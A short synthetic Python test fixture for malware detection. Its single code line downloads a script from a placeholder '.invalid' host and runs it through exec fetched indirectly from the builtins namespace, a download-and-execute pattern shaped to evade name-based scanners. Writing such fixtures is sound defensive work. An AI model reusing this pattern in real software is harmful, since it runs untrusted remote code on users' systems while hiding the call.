# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shape: a downloaded text is run by exec taken from the builtins namespace instead of
# being called by name. Host is a non-existent .invalid domain.
import builtins

import requests

vars(builtins)['exec'](requests.get('https://dl.example.invalid/stage.py').text)
